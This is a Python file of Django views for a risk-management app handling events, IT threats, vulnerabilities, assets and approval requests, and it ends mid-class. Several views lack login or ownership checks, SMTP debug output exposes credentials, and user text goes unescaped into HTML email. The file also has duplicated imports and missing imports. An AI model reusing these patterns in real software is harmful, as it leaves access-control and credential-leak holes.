
from django.shortcuts import render, get_object_or_404, redirect
from django.views.generic import View
from django.views.generic.edit import DeleteView
from django.urls import reverse_lazy
from .models import Event
from django.shortcuts import render, redirect
from django.views.generic import View
from .models import Event
from .forms import EventForm
from docx import Document
from docx.shared import Pt

class EventCreateView(View):
    def get(self, request):
        form = EventForm()
        return render(request, 'events/event_form.html', {'form': form})

    def post(self, request):
        form = EventForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect('event_list')
        return render(request, 'events/event_form.html', {'form': form})

from django.db.models import Q

class EventListView(View):
    def get(self, request):
        if not request.user.is_authenticated:
            # Redirect to login page if the user is not authenticated
            return redirect('login')

        # Get the user's profile
        user_profile = request.user.userprofile  # Assuming UserProfile is linked to User

        # Filter events where the user is either associated with the portfolio or is the reporter
        # Filter events for superuser or based on user's portfolios/reporter
        if request.user.is_superuser:
            # Superuser sees all events
            events = Event.objects.all()
        else:
            # Regular user sees events associated with their portfolios or reported by them
            events = Event.objects.filter(
                Q(portfolio__in=user_profile.portfolios.all()) |  # User is associated with the portfolio
                Q(reporter=user_profile)  # User is the reporter
            ).distinct()







        return render(request, 'events/event_list.html', {'events': events})

from django.shortcuts import get_object_or_404, render
from django.views import View
from .models import Event, Risk

class EventDetailView(View):
    def get(self, request, pk):
        event = get_object_or_404(Event, pk=pk)
        related_risks = event.risks.all()  # Fetch related risks using the ManyToMany field
        return render(request, 'events/event_detail.html', {'event': event, 'related_risks': related_risks})



# =============================================================================


from django.shortcuts import render, get_object_or_404, redirect
from django.contrib import messages
from .models import ITThreat, Vulnerability, ITAsset
from django.http import HttpResponse

# List view for ITThreats
def itthreat_list(request):
    threats = ITThreat.objects.all()
    if request.method == 'POST':
        if 'add' in request.POST:
            # Add a new ITThreat
            code = request.POST.get('code')
            description = request.POST.get('description')
            risk_sources = request.POST.get('risk_sources')
            category = request.POST.get('category')
            ITThreat.objects.create(
                code=code, description=description, risk_sources=risk_sources, category=category
            )
            messages.success(request, "New ITThreat added successfully.")
        elif 'delete' in request.POST:
            # Delete selected ITThreat
            threat_id = request.POST.get('delete_id')
            threat = ITThreat.objects.get(id=threat_id)
            threat.delete()
            messages.success(request, f"{threat.code} has been deleted.")
        return redirect('itthreat_list')
    return render(request, 'itthreat/itthreat_list.html', {'threats': threats})

# List view for Vulnerabilities
def vulnerability_list(request):
    vulnerabilities = Vulnerability.objects.all()
    if request.method == 'POST':
        if 'add' in request.POST:
            # Add a new Vulnerability
            code = request.POST.get('code')
            description = request.POST.get('description')
            category = request.POST.get('category')
            Vulnerability.objects.create(code=code, description=description, category=category)
            messages.success(request, "New Vulnerability added successfully.")
        elif 'delete' in request.POST:
            # Delete selected Vulnerability
            vulnerability_id = request.POST.get('delete_id')
            vulnerability = Vulnerability.objects.get(id=vulnerability_id)
            vulnerability.delete()
            messages.success(request, f"{vulnerability.code} has been deleted.")
        return redirect('vulnerability_list')
    return render(request, 'vulnerability/vulnerability_list.html', {'vulnerabilities': vulnerabilities})

# Detail view for ITThreat
from django.shortcuts import render, get_object_or_404, redirect
from django.http import HttpResponseBadRequest
from .models import ITThreat, ITAsset

def itthreat_detail(request, threat_id):
    threat = get_object_or_404(ITThreat, id=threat_id)

    if request.method == "POST":
        action = request.POST.get("action")

        if action == "update":
            # Update the threat details
            threat.code = request.POST.get("code", threat.code)
            threat.description = request.POST.get("description", threat.description)
            threat.save()
            return redirect("itthreat_detail", threat_id=threat.id)

        elif action == "link":
            # Link an IT Asset
            asset_id = request.POST.get("asset_id")
            try:
                asset = ITAsset.objects.get(id=asset_id)  # Ensure asset exists
                threat.assets.add(asset)
                return redirect("itthreat_detail", threat_id=threat.id)
            except ITAsset.DoesNotExist:
                return HttpResponseBadRequest("The selected IT Asset does not exist.")

        elif action == "unlink":
            # Unlink an IT Asset
            asset_id = request.POST.get("asset_id")
            try:
                asset = ITAsset.objects.get(id=asset_id)
                threat.assets.remove(asset)
                return redirect("itthreat_detail", threat_id=threat.id)
            except ITAsset.DoesNotExist:
                return HttpResponseBadRequest("The selected IT Asset does not exist.")

    # Fetch all available assets for linking
    assets = ITAsset.objects.exclude(id__in=threat.assets.all())

    return render(request, "itthreat/itthreat_detail.html", {"threat": threat, "assets": assets})

from django.shortcuts import render, get_object_or_404, redirect
from django.http import HttpResponseBadRequest
from .models import Vulnerability, ITAsset

def vulnerability_detail(request, vulnerability_id):
    vulnerability = get_object_or_404(Vulnerability, id=vulnerability_id)

    if request.method == "POST":
        action = request.POST.get("action")

        if action == "update":
            # Update vulnerability details
            vulnerability.code = request.POST.get("code", vulnerability.code)
            vulnerability.description = request.POST.get("description", vulnerability.description)
            vulnerability.save()
            return redirect("vulnerability_detail", vulnerability_id=vulnerability.id)

        elif action == "link":
            # Link an IT Asset
            asset_id = request.POST.get("asset_id")
            try:
                asset = ITAsset.objects.get(id=asset_id)  # Ensure asset exists
                vulnerability.assets.add(asset)
                return redirect("vulnerability_detail", vulnerability_id=vulnerability.id)
            except ITAsset.DoesNotExist:
                return HttpResponseBadRequest("The selected IT Asset does not exist.")

        elif action == "unlink":
            # Unlink an IT Asset
            asset_id = request.POST.get("asset_id")
            try:
                asset = ITAsset.objects.get(id=asset_id)
                vulnerability.assets.remove(asset)
                return redirect("vulnerability_detail", vulnerability_id=vulnerability.id)
            except ITAsset.DoesNotExist:
                return HttpResponseBadRequest("The selected IT Asset does not exist.")

    # Fetch all available assets for linking
    assets = ITAsset.objects.exclude(id__in=vulnerability.assets.all())

    return render(request, "vulnerability/vulnerability_detail.html", {"vulnerability": vulnerability, "assets": assets})


# =============================================================================





from django.shortcuts import render, get_object_or_404
from .models import Document

def document_preview(request, doc_id):
    document = get_object_or_404(Document, id=doc_id)
    return render(request, 'documents/document_preview.html', {'document': document})








from django.contrib.auth.views import PasswordResetView
from django.core.mail import EmailMessage
from django.urls import reverse_lazy
from django.utils.html import strip_tags
from django.conf import settings
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import base64
import logging

import base64
import logging
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from django.contrib.auth.models import User
from django.contrib.auth.tokens import default_token_generator
from django.http import HttpResponseRedirect
from django.urls import reverse_lazy
from django.utils.encoding import force_bytes
from django.utils.http import urlsafe_base64_encode
from django.views.generic.edit import FormView
from django.contrib.auth.views import PasswordResetView

# Assuming SMTPSetting is a model in your app
from orm.models import SMTPSetting  # Replace 'your_app' with your actual app name

class CustomPasswordResetView(PasswordResetView):
    template_name = 'registration/password_reset_form.html'  # Use your template path
    success_url = reverse_lazy('password_reset_done')  # Redirect after successful password reset request

    def send_reset_email(self, user_email, reset_link):
        """
        Custom function to send the password reset email.
        """
        subject = "Password Reset Request"
        message = f"""
      <html>
    <body style="font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 600px; margin: 0 auto; padding: 20px;">
        <p>Hello,</p>
        <p>You have requested to reset your password. Please click the link below to reset it:</p>
        <p><a href="{reset_link}" style="color: #0066cc; text-decoration: none; padding: 8px 16px; border: 1px solid #0066cc; border-radius: 4px; display: inline-block;">Reset Password</a></p>
        <p>If you did not request this, please ignore this email.</p>
        <p>Thank you,<br>ermapp.avax.gr (admin)</p>
        <div style="margin-top: 20px;">
            <img src="static/images/email_signature.png" alt="Email Signature" style="max-width: 100%; height: auto;">
        </div>
    </body>
</html>
        """

        # Fetch SMTP settings from your database
        smtp_settings = SMTPSetting.objects.first()

        if smtp_settings and smtp_settings.admin_email:
            recipient_list = [user_email]
            self.send_email(subject, message, recipient_list)
        else:
            logging.error("Admin email not configured in SMTP settings.")

    def send_email(self, subject, message, recipient_list):
        """
        Send email using SMTP settings from the database.
        """
        smtp_settings = SMTPSetting.objects.first()

        if not smtp_settings:
            logging.error("SMTP settings not configured.")
            return

        msg = MIMEMultipart()
        msg['From'] = smtp_settings.sender_email
        msg['To'] = ', '.join(recipient_list)
        msg['Subject'] = subject

        # Attach the HTML message
        msg.attach(MIMEText(message, 'html'))

        # SMTP server configuration
        smtp_host = smtp_settings.smtp_server
        smtp_port = smtp_settings.smtp_port
        smtp_user = smtp_settings.smtp_username
        smtp_password = smtp_settings.smtp_password

        # Encode username and password in Base64
        encoded_user = base64.b64encode(smtp_user.encode()).decode()
        encoded_password = base64.b64encode(smtp_password.encode()).decode()

        try:
            # Connect to the SMTP server
            server = smtplib.SMTP(smtp_host, smtp_port)
            server.set_debuglevel(1)  # Enable debug output
            server.ehlo()
            server.starttls()  # Secure the connection
            server.ehlo()

            # Perform AUTH LOGIN manually
            server.docmd("AUTH LOGIN", encoded_user)
            server.docmd(encoded_password)

            # Send the email
            server.sendmail(msg['From'], recipient_list, msg.as_string())
            server.quit()
            logging.info(f"Email sent successfully to {recipient_list}")
        except smtplib.SMTPException as e:
            logging.error(f"Failed to send email: {e}")

    def form_valid(self, form):
        """
        Override form_valid to generate the reset link and send the custom email.
        """
        # Generate password reset token and link
        user_email = form.cleaned_data['email']
        reset_link = self.get_password_reset_link(user_email)

        # Send the custom email
        self.send_reset_email(user_email, reset_link)

        # Redirect to the success URL manually
        return HttpResponseRedirect(self.success_url)

    def get_password_reset_link(self, email):
        """
        Generate a password reset link for the given email.
        """
        try:
            user = User.objects.get(email=email)
            uid = urlsafe_base64_encode(force_bytes(user.pk))
            token = default_token_generator.make_token(user)
            reset_link = f"{self.request.scheme}://{self.request.get_host()}/reset/{uid}/{token}/"
            return reset_link
        except User.DoesNotExist:
            logging.error(f"User with email {email} does not exist.")
            return None

from django.utils.decorators import method_decorator
from django.contrib.auth.decorators import login_required
from django.core.mail import EmailMessage
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import logging
import base64
from .models import SMTPSetting

from django.shortcuts import get_object_or_404, render, redirect
from django.views import View
from .forms import EventForm
from .models import Event, Risk
import logging
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import base64

from django.shortcuts import get_object_or_404, render, redirect
from django.views import View
from .forms import EventForm
from .models import Event, Risk

from django.shortcuts import get_object_or_404, render, redirect
from django.views import View
from .forms import EventForm
from .models import Event, Risk
import logging
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import base64


from django.shortcuts import get_object_or_404, render, redirect
from django.urls import reverse
from .models import Risk, Event
from .forms import EventForm

class EventCreateView(View):
    def get(self, request):
        # Retrieve the risk_id from query parameters
        risk_id = request.GET.get('link_to_risk')  # Retrieve risk ID from query string
        form = EventForm()
        return render(request, 'events/event_form.html', {
            'form': form,
            'risk_id': risk_id,  # Pass the risk_id to the template
        })

    def post(self, request):
        # Retrieve the risk_id from query parameters or form submission
        risk_id = request.POST.get('link_to_risk') or request.GET.get('link_to_risk')
        form = EventForm(request.POST)
        if form.is_valid():
            # Create the event instance without saving it yet
            event = form.save(commit=False)
            event.reporter = request.user.userprofile  # Set the reporter
            event.save()  # Save the event to the database

            # If a risk ID is provided, link the event to the specified risk
            if risk_id:
                risk = get_object_or_404(Risk, id=risk_id)  # Fetch the risk object
                event.risks.add(risk)  # Add the risk to the ManyToMany relationship
                event.save()  # Save changes to the event

            # Send email notification
            self.send_event_created_email(request, event)

            # Redirect to the risk detail page or event list
            if risk_id:
                return redirect(reverse('risk_detail', args=[risk_id]))
            return redirect('event_list')

        # Render the form again in case of errors
        return render(request, 'events/event_form.html', {
            'form': form,
            'risk_id': risk_id,  # Pass the risk_id back to the template
        })

    def send_event_created_email(self, request, event):
        """
        Send an email to the admin notifying them that a new event has been created.
        """
        subject = f"New Event Created: '{event.title}'"
        message = f"""
        <html>
            <body>
                <p>A new event <strong>'{event.title}'</strong> has been created by {event.reporter}.<br>
                Here are the details:<br><br>
                <strong>Title:</strong> {event.title}<br>
                <strong>Description:</strong> {event.description}<br>
                <strong>Owner:</strong> {event.owner}<br>
                <strong>Portfolio:</strong> {event.portfolio}<br>
                <strong>Reporter:</strong> {event.reporter}
                </p>
                <p>Thank you, <strong>ermapp.avax.gr (admin)</strong></p>
            </body>
        </html>
        """

        smtp_settings = SMTPSetting.objects.first()

        if smtp_settings and smtp_settings.admin_email:
            recipient_list = [smtp_settings.admin_email]
            self.send_email(subject, message, recipient_list)
        else:
            logging.error("Admin email not configured in SMTP settings.")

    def send_email(self, subject, message, recipient_list):
        """
        Send the email using the configured SMTP settings.
        """
        smtp_settings = SMTPSetting.objects.first()

        if not smtp_settings:
            logging.error("SMTP settings not configured.")
            return

        msg = MIMEMultipart()
        msg['From'] = smtp_settings.sender_email
        msg['To'] = ', '.join(recipient_list)
        msg['Subject'] = subject
        msg.attach(MIMEText(message, 'html'))

        smtp_host = smtp_settings.smtp_server
        smtp_port = smtp_settings.smtp_port
        smtp_user = smtp_settings.smtp_username
        smtp_password = smtp_settings.smtp_password

        encoded_user = base64.b64encode(smtp_user.encode()).decode()
        encoded_password = base64.b64encode(smtp_password.encode()).decode()

        try:
            server = smtplib.SMTP(smtp_host, smtp_port)
            server.set_debuglevel(1)
            server.ehlo()
            server.starttls()
            server.ehlo()

            # Perform manual AUTH LOGIN
            server.docmd("AUTH LOGIN", encoded_user)
            server.docmd(encoded_password)

            server.sendmail(msg['From'], recipient_list, msg.as_string())
            server.quit()
            logging.info(f"Email sent successfully to {recipient_list}")
        except smtplib.SMTPException as e:
            logging.error(f"Failed to send email: {e}")


class EventUpdateView(View):
    def get(self, request, pk):
        event = get_object_or_404(Event, pk=pk)  # Fetch the event
        form = EventForm(instance=event)  # Create the form with the event instance
        all_risks = Risk.objects.all()  # Fetch all risks for the dropdown
        related_risks = event.risks.all()  # Fetch only risks linked to this event
        return render(request, 'events/event_form.html', {
            'form': form,
            'event': event,
            'all_risks': all_risks,
            'related_risks': related_risks,
        })

    def post(self, request, pk):
        event = get_object_or_404(Event, pk=pk)  # Fetch the event
        form = EventForm(request.POST, instance=event)  # Bind form data to the event instance

        # Fetch existing linked risks in case they are not passed in POST
        existing_risks = event.risks.all()

        if form.is_valid():
            # Save the event details first
            event = form.save(commit=False)
            event.save()

            # Manage Many-to-Many relationship with risks
            selected_risks = request.POST.getlist('risks')  # Get selected risks from the form
            if selected_risks:
                risks_to_link = Risk.objects.filter(id__in=selected_risks)
                event.risks.set(risks_to_link)  # Update the Many-to-Many relationship
            else:
                event.risks.set(existing_risks)  # Retain the previously linked risks

            return redirect('event_list')  # Redirect to the event list

        # Reload risks for redisplay if the form is invalid
        all_risks = Risk.objects.all()
        related_risks = event.risks.all()
        return render(request, 'events/event_form.html', {
            'form': form,
            'event': event,
            'all_risks': all_risks,
            'related_risks': related_risks,
        })  
from django.shortcuts import get_object_or_404, redirect
from django.http import JsonResponse

from django.contrib import messages
from django.shortcuts import get_object_or_404, redirect

def link_risk_to_event(request, event_id):
    """
    View to link a selected risk to a specific event.
    """
    if request.method == "POST":
        risk_id = request.POST.get("risk_id")  # Get the selected risk ID from the POST data
        event = get_object_or_404(Event, id=event_id)  # Get the event instance

        if risk_id:
            risk = get_object_or_404(Risk, id=risk_id)  # Get the selected risk instance
            event.risks.add(risk)  # Add the risk to the event's ManyToMany relationship

            # Add a success message
            messages.success(request, f"The risk '{risk.title}' has been successfully linked to the event.")

            return redirect('event_edit', pk=event_id)

        # Add an error message if the risk ID is invalid
        messages.error(request, "Invalid risk ID.")
        return redirect('event_edit', pk=event_id)

    # Add an error message for invalid request methods
    messages.error(request, "Invalid request method.")
    return redirect('event_edit', pk=event_id)

def unlink_risk(request, event_id, risk_id):
    event = get_object_or_404(Event, id=event_id)
    risk = get_object_or_404(Risk, id=risk_id)

    # Remove the risk from the event
    event.risks.remove(risk)

    # Redirect back to the event edit page
    return redirect(reverse('event_edit', args=[event_id]))
        
class EventDeleteView(DeleteView):
    model = Event
    template_name = 'events/event_confirm_delete.html'
    success_url = reverse_lazy('event_list')


from django.shortcuts import render, get_object_or_404, redirect
from django.views import View
from .models import Portfolio
from .forms import PortfolioForm

class PortfolioListView(View):
    def get(self, request):
        if not request.user.is_authenticated:
            # Redirect to login page if the user is not authenticated
            return redirect('login')

        # Get the user's profile and filter portfolios based on it
        user_profile = request.user.userprofile  # Assuming UserProfile is linked to User
        portfolios = Portfolio.objects.filter(user_profiles=user_profile).distinct()

        return render(request, 'portfolios/portfolio_list.html', {'portfolios': portfolios})

from django.shortcuts import render, get_object_or_404, redirect
from django.utils.html import strip_tags
from html import unescape
from .models import Portfolio
from .forms import PortfolioForm

class PortfolioDetailView(View):
    def get(self, request, pk):
        portfolio = get_object_or_404(Portfolio, pk=pk)
        form = PortfolioForm(instance=portfolio)
        return render(request, 'portfolios/portfolio_detail.html', {'form': form, 'portfolio': portfolio})

    def post(self, request, pk):
        portfolio = get_object_or_404(Portfolio, pk=pk)
        form = PortfolioForm(request.POST, instance=portfolio)
        if form.is_valid():
            # Clean the name and description fields before saving
            portfolio.name = unescape(strip_tags(form.cleaned_data['name']))  # Remove HTML tags and decode HTML entities
            portfolio.description = unescape(strip_tags(form.cleaned_data['description']))  # Same for description
            portfolio.save()
            return redirect('portfolio_list')
        return render(request, 'portfolios/portfolio_detail.html', {'form': form, 'portfolio': portfolio})


from django.shortcuts import render, get_object_or_404, redirect
from django.views import View
from django.views.generic.edit import DeleteView
from django.urls import reverse_lazy
from .models import ITAsset
from .forms import ITAssetForm

class ITAssetListView(View):
    def get(self, request):
        it_assets = ITAsset.objects.all().order_by('name')
        return render(request, 'itassets/itasset_list.html', {'it_assets': it_assets})


from django.shortcuts import get_object_or_404, render
from django.views import View
from .models import ITAsset, Risk
from django.db.models import Q
from django.contrib.auth.mixins import LoginRequiredMixin
from django.shortcuts import get_object_or_404, render
from .models import ITAsset, Risk, UserProfile


class ITAssetDetailView(LoginRequiredMixin, View):
    def get(self, request, pk):
        # Retrieve the specific IT asset
        it_asset = get_object_or_404(ITAsset, pk=pk)
        
        # Get the user's profile and portfolios
        user_profile = UserProfile.objects.filter(user=request.user).first()
        user_portfolios = user_profile.portfolios.all() if user_profile else None

        # If the user has portfolios, get risks only from their portfolios
        if user_portfolios:
            all_risks = Risk.objects.filter(portfolio__in=user_portfolios).distinct()
        else:
            all_risks = Risk.objects.none()  # No risks available for users without portfolios

        # Get risks currently linked to the IT asset
        linked_risks = it_asset.risks.all()

        # Exclude already linked risks from the dropdown list
        available_risks = all_risks.exclude(id__in=linked_risks.values_list('id', flat=True))
        
        context = {
            'it_asset': it_asset,
            'linked_risks': linked_risks,
            'available_risks': available_risks,
        }
        return render(request, 'itassets/itasset_detail.html', context)




from django.shortcuts import render, redirect
from django.contrib import messages
from .models import ITAsset, Risk, ITThreat, Vulnerability, UserProfile
from django.views import View
from .forms import ITAssetForm  # Ensure you have this form created in forms.py

from django.shortcuts import render, redirect
from django.contrib import messages
from .models import ITAsset, Risk, ITThreat, Vulnerability, UserProfile
from django.views import View
from .forms import ITAssetForm  # Ensure you have this form created in forms.py
from django.shortcuts import render, redirect
from django.views import View
from django.contrib import messages
from .models import ITAsset, Risk, ITThreat, Vulnerability, UserProfile
from .forms import ITAssetForm

from django.shortcuts import render, redirect
from django.views import View
from django.contrib import messages
from .models import ITAsset, Risk, ITThreat, Vulnerability, UserProfile
from .forms import ITAssetForm
import logging

logger = logging.getLogger(__name__)

from django.shortcuts import render, redirect
from django.views import View
from django.contrib import messages
from .models import ITAsset, Risk, ITThreat, Vulnerability, UserProfile, Portfolio
from .forms import ITAssetForm
import logging

logger = logging.getLogger(__name__)

from django.shortcuts import render, redirect
from django.views import View
from django.contrib import messages
from .models import ITAsset, Risk, ITThreat, Vulnerability, UserProfile, Portfolio
from .forms import ITAssetForm
import logging

logger = logging.getLogger(__name__)

class ITAssetCreateView(View):
    def get(self, request):
        form = ITAssetForm()

        all_risks = Risk.objects.all()
        all_threats = ITThreat.objects.all()
        all_vulnerabilities = Vulnerability.objects.all()
        all_owners = UserProfile.objects.all()
        all_portfolios = Portfolio.objects.all()

        # Fetch choices for asset type and status (assuming they are defined in your model)
        asset_type_choices = ITAsset.ASSET_TYPE_CHOICES
        status_choices = ITAsset.STATUS_CHOICES

        return render(
            request,
            'itassets/itasset_form.html',
            {
                'form': form,
                'all_risks': all_risks,
                'all_threats': all_threats,
                'all_vulnerabilities': all_vulnerabilities,
                'all_owners': all_owners,
                'all_portfolios': all_portfolios,
                'asset_type_choices': asset_type_choices,
                'status_choices': status_choices,
            }
        )

    def post(self, request):
        form = ITAssetForm(request.POST)

        if form.is_valid():
            try:
                it_asset = form.save(commit=False)
                it_asset.portfolio_id = request.POST.get('portfolio')
                it_asset.asset_type = request.POST.get('asset_type')
                it_asset.status = request.POST.get('status')
                it_asset.criticality = request.POST.get('criticality')
                it_asset.confidentiality = request.POST.get('confidentiality')
                it_asset.integrity = request.POST.get('integrity')
                it_asset.availability = request.POST.get('availability')

                it_asset.save()

                # Link selected risks, threats, vulnerabilities, and owners
                risk_ids = request.POST.getlist('risk_id')
                threat_ids = request.POST.getlist('threat_id')
                vulnerability_ids = request.POST.getlist('vulnerability_id')
                owner_ids = request.POST.getlist('owner_id')

                if risk_ids:
                    it_asset.risks.set(Risk.objects.filter(id__in=risk_ids))
                if threat_ids:
                    it_asset.threats.set(ITThreat.objects.filter(id__in=threat_ids))
                if vulnerability_ids:
                    it_asset.vulnerabilities.set(Vulnerability.objects.filter(id__in=vulnerability_ids))
                if owner_ids:
                    it_asset.owners.set(UserProfile.objects.filter(id__in=owner_ids))

                messages.success(request, f'IT Asset "{it_asset.name}" created successfully!')
                return redirect('itasset_edit', pk=it_asset.pk)

            except Exception as e:
                logger.error(f"Error saving IT Asset: {e}")
                messages.error(request, "An error occurred while saving the IT Asset.")

        else:
            logger.error(f"Form errors: {form.errors}")
            messages.error(request, "Form submission failed. Check required fields.")

        # Reload form data in case of an error
        all_risks = Risk.objects.all()
        all_threats = ITThreat.objects.all()
        all_vulnerabilities = Vulnerability.objects.all()
        all_owners = UserProfile.objects.all()
        all_portfolios = Portfolio.objects.all()

        asset_type_choices = ITAsset.ASSET_TYPE_CHOICES
        status_choices = ITAsset.STATUS_CHOICES

        return render(
            request,
            'itassets/itasset_form.html',
            {
                'form': form,
                'all_risks': all_risks,
                'all_threats': all_threats,
                'all_vulnerabilities': all_vulnerabilities,
                'all_owners': all_owners,
                'all_portfolios': all_portfolios,
                'asset_type_choices': asset_type_choices,
                'status_choices': status_choices,
            }
        )

from django.contrib.auth.mixins import LoginRequiredMixin
from django.shortcuts import get_object_or_404, redirect, render
from .models import ITAsset, Risk, UserProfile
from .forms import ITAssetForm


from django.shortcuts import get_object_or_404, redirect, render
from django.views import View
from django.contrib.auth.mixins import LoginRequiredMixin
from .models import ITAsset, Risk, UserProfile
from .forms import ITAssetForm

from django.shortcuts import render, get_object_or_404, redirect
from django.contrib import messages
from django.http import HttpResponse
from .models import ITAsset, Risk, ITThreat, Vulnerability
from .forms import ITAssetForm
from django.views import View
from django.contrib.auth.mixins import LoginRequiredMixin
from django.shortcuts import render, get_object_or_404, redirect
from django.contrib import messages
from .models import ITAsset, Risk, ITThreat, Vulnerability, UserProfile
from .forms import ITAssetForm
from django.views import View
from django.contrib.auth.mixins import LoginRequiredMixin

from django.shortcuts import render, get_object_or_404, redirect
from django.contrib import messages
from .models import ITAsset, Risk, ITThreat, Vulnerability, UserProfile
from django.views import View
from django.contrib.auth.mixins import LoginRequiredMixin

from django.shortcuts import get_object_or_404, redirect, render
from django.contrib import messages
from django.views import View
from django.contrib.auth.mixins import LoginRequiredMixin
from .models import ITAsset, Risk, ITThreat, Vulnerability, UserProfile, Portfolio


from django.shortcuts import render, get_object_or_404, redirect
from django.contrib.auth.mixins import LoginRequiredMixin
from django.contrib import messages
from django.views import View
from .models import ITAsset, Risk, ITThreat, Vulnerability, UserProfile, Portfolio
from .forms import ITAssetForm


from django.shortcuts import render, get_object_or_404, redirect
from django.contrib.auth.mixins import LoginRequiredMixin
from django.contrib import messages
from django.views import View
from .models import ITAsset, Risk, ITThreat, Vulnerability, UserProfile, Portfolio
from .forms import ITAssetForm

class ITAssetUpdateView(LoginRequiredMixin, View):
    def get(self, request, pk):
        """Render IT Asset update form with linked/unlinked items."""
        it_asset = get_object_or_404(ITAsset, pk=pk)

        # Get the user's profile
        user_profile = request.user.userprofile
        user_portfolios = user_profile.portfolios.all() if user_profile else Portfolio.objects.none()

        # Get linked items
        linked_risks = it_asset.risks.all().order_by('title')
        linked_threats = it_asset.threats.all()
        linked_vulnerabilities = it_asset.vulnerabilities.all()
        linked_owners = it_asset.owners.all()

        # ✅ Filter `Risk` by portfolio
        all_risks = Risk.objects.filter(portfolio__in=user_portfolios).exclude(id__in=linked_risks.values_list('id', flat=True)).order_by('title')

        # ❌ Do NOT filter threats and vulnerabilities by portfolio (they don't have one)
        all_threats = ITThreat.objects.exclude(id__in=linked_threats.values_list('id', flat=True))
        all_vulnerabilities = Vulnerability.objects.exclude(id__in=linked_vulnerabilities.values_list('id', flat=True))

        all_owners = UserProfile.objects.exclude(id__in=linked_owners.values_list('id', flat=True))
        all_portfolios = user_portfolios  # ✅ Only show portfolios assigned to the user

        form = ITAssetForm(instance=it_asset)

        return render(
            request,
            'itassets/itasset_form.html',
            {
                'form': form,
                'it_asset': it_asset,
                'linked_risks': linked_risks,
                'linked_threats': linked_threats,
                'linked_vulnerabilities': linked_vulnerabilities,
                'linked_owners': linked_owners,
                'all_risks': all_risks,  # ✅ Filtered by portfolio
                'all_threats': all_threats,  # ❌ No portfolio filter
                'all_vulnerabilities': all_vulnerabilities,  # ❌ No portfolio filter
                'all_owners': all_owners,
                'all_portfolios': all_portfolios,
            }
        )

    def post(self, request, pk):
        """Handle IT Asset update and linking/unlinking operations."""
        it_asset = get_object_or_404(ITAsset, pk=pk)
        form = ITAssetForm(request.POST, instance=it_asset)

        if "save_asset" in request.POST:
            if form.is_valid():
                form.save()
                messages.success(request, "IT Asset updated successfully!")
            else:
                messages.error(request, "Failed to update IT Asset. Please check errors below.")

        # Function to handle linking/unlinking relationships
        def handle_linking(action, model, attr_name, success_msg):
            """Handles linking and unlinking of relationships."""
            obj_id = request.POST.get(action)
            if obj_id:
                obj = get_object_or_404(model, id=obj_id)
                relation = getattr(it_asset, attr_name)
                if "unlink" in action:
                    relation.remove(obj)
                else:
                    relation.add(obj)
                messages.success(request, success_msg.format(obj))

        # Linking/unlinking relationships for Risks, Threats, Vulnerabilities, and Owners
        actions = [
            ('link_risk', Risk, 'risks', "Linked risk: {}"),
            ('unlink_risk', Risk, 'risks', "Unlinked risk: {}"),
            ('link_threat', ITThreat, 'threats', "Linked IT threat: {}"),
            ('unlink_threat', ITThreat, 'threats', "Unlinked IT threat: {}"),
            ('link_vulnerability', Vulnerability, 'vulnerabilities', "Linked vulnerability: {}"),
            ('unlink_vulnerability', Vulnerability, 'vulnerabilities', "Unlinked vulnerability: {}"),
            ('link_owner', UserProfile, 'owners', "Linked owner: {}"),
            ('unlink_owner', UserProfile, 'owners', "Unlinked owner: {}"),
        ]

        for action, model, attr, message in actions:
            handle_linking(action, model, attr, message)

        return redirect('itasset_edit', pk=it_asset.pk)


class ITAssetDeleteView(DeleteView):
    model = ITAsset
    template_name = 'itassets/itasset_confirm_delete.html'
    success_url = reverse_lazy('itasset_list')

from django.shortcuts import get_object_or_404, redirect, render
from django.views import View
from django.views.generic.edit import DeleteView
from django.urls import reverse_lazy
from .models import ApprovalRequest
from .forms import ApprovalRequestForm

from django.shortcuts import render, redirect
from django.views import View
from .models import ApprovalRequest

class ApprovalRequestListView(View):
    def get(self, request):
        if not request.user.is_authenticated:
            return redirect('login')

        # Filter for pending approval requests
        approval_requests = ApprovalRequest.objects.filter(
            user=request.user.userprofile,  # Assuming this relates to the logged-in user
            status='pending'  # Filter for pending status
        )

        return render(request, 'approval_requests/approval_request_list.html', {
            'approval_requests': approval_requests
        })
    

class ApprovalRequestDetailView(View):
    def get(self, request, pk):
        approval_request = get_object_or_404(ApprovalRequest, pk=pk)
        return render(request, 'approval_requests/approval_request_detail.html', {'approval_request': approval_request})

from django.views import View
from django.shortcuts import redirect
from django.contrib import messages
from .models import ApprovalRequest

class ApprovalRequestApproveBulkView(View):
    def post(self, request):
        selected_ids = request.POST.getlist('selected_requests')
        if selected_ids:
            # Fetch the approval requests that are selected
            approval_requests = ApprovalRequest.objects.filter(pk__in=selected_ids)
            
            for request_obj in approval_requests:
                # Update the current approval request as approved
                request_obj.status = 'approved'
                request_obj.save()

                # Fetch the associated risk and review cycle
                risk = request_obj.risk
                review_cycle = risk.approval_cycle  # Assuming `approval_cycle` is a field in the Risk model
                
                if review_cycle:
                    # Calculate the next approval date based on the review cycle
                    cycle_mapping = {
                        'weekly': 7,
                        'monthly': 30,
                        'quarterly': 90,
                        'biannual': 180,
                        'annual': 365,
                    }
                    days_to_add = cycle_mapping.get(review_cycle, 0)
                    
                    next_approval_date = now().date() + timedelta(days=days_to_add)
                    
                    # Create a new approval request for the next cycle
                    ApprovalRequest.objects.create(
                        risk=risk,
                        user=request_obj.user,  # Assign the same user
                        status='pending',
                        due_date=next_approval_date,
                        rational=request_obj.rational,  # Copy rational if necessary
                    )

            messages.success(request, "Επιλεγμένα αιτήματα εγκρίθηκαν επιτυχώς, και δημιουργήθηκαν νέα αιτήματα σύμφωνα με τον κύκλο αναθεώρησης του κινδύνου!")
        else:
            messages.warning(request, "Δεν επιλέχθηκαν αιτήματα για έγκριση.")
        return redirect('approval_request_list')  # Redirect to the list view
    
class ApprovalRequestCreateView(View):
    def get(self, request):
        form = ApprovalRequestForm()
        return render(request, 'approval_requests/approval_request_form.html', {'form': form})

    def post(self, request):
        form = ApprovalRequestForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect('approval_request_list')
        return render(request, 'approval_requests/approval_request_form.html', {'form': form})


class ApprovalRequestUpdateView(View):
